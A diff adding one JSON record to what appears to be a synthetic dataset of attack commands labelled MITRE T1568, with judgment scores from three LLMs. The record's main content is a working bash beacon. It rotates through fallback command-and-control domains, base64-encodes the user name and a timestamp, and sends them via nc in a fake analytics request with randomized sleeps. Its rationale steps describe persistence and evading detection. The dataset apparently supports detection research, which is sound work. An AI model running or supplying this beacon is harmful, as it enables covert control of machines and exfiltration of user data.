@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1568",
+  "platform": "Linux",
+  "shell": "bash",
+  "command": "bash -c \"while true; do host=metrics.example.org; ip=''; for h in \\\"$host\\\" cdn-metrics.example.org assets.example.net; do ip=$(dig +short \\\"$h\\\" | shuf -n1); if [ -n \\\"$ip\\\" ]; then host=\\\"$h\\\"; break; fi; done; ua=\\\"Mozilla/5.0 (X11; Linux)\\\"; ts=$(date -u +%s); q=\\\"q=$(printf '%s:%s' \\\"$USER\\\" \\\"$ts\\\" | base64 -w0)\\\"; printf 'GET /collect?%s HTTP/1.1\\r\\nHost: %s\\r\\nUser-Agent: %s\\r\\nConnection: close\\r\\n\\r\\n' \\\"$q\\\" \\\"$host\\\" \\\"$ua\\\" | nc -w 5 \\\"$ip\\\" 80; sleep $((RANDOM%60+120)); done\"",
+  "explanation": "Sets up a periodic beacon that re-resolves a preferred domain each cycle with fallback domains to maintain persistence; sends base64 data in a query string to mimic analytics collection.",
+  "rationale_steps": [
+    "Continuously re-resolve C2 host at runtime to track fast-changing IPs.",
+    "Fallback to secondary domains when resolution fails.",
+    "Use realistic HTTP GET with query params and standard headers.",
+    "Randomize sleep intervals to blend with user activity patterns."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1568-213026ff-654de9c0",
+  "source_prompt_hash": "213026ff",
+  "timestamp_utc": "2025-09-30T03:23:47.812011Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The bash one-liner is well-formed with balanced quoting, proper separators, valid expansions, and standard options, making it parseable as-is.",
+        "semantic_score": 5,
+        "semantic_justification": "It implements periodic beaconing that re-resolves and randomly selects active IPs from a fallback domain list each cycle, aligning with dynamic resolution/rotating endpoint behavior under T1568.",
+        "combined_score": 5.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T07:49:36.466530Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 4,
+        "syntactic_justification": "The command is largely well-formed with balanced quotes and valid constructs, though the nested variable reuse of `host` as both the initial value and loop variable, combined with complex quoting inside the for loop, creates edge cases that may behave unexpectedly in some bash versions.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately implements T1568 dynamic resolution by re-resolving multiple fallback domains each beacon cycle using `dig`, randomly selecting an IP with `shuf`, encoding exfiltrated data (username + timestamp) as base64 in a query string, mimicking legitimate analytics traffic with a browser User-Agent, and using randomized sleep intervals to evade beaconing detection—all operationally plausible and well-aligned with the technique.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2026-02-19T00:30:43.704924Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is well-formed with correctly escaped double quotes for a bash -c execution context, balanced control structures, and proper command chaining.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately demonstrates dynamic resolution by rotating through a list of domains, resolving them at runtime using dig, handling multiple potential IPs with shuf, and implementing a jittered beaconing behavior that mimics legitimate analytics traffic.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2026-02-19T00:30:54.966333Z"
+      }
+    ],
+    "llm_average_syntactic": 4.667,
+    "llm_average_semantic": 5.0,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
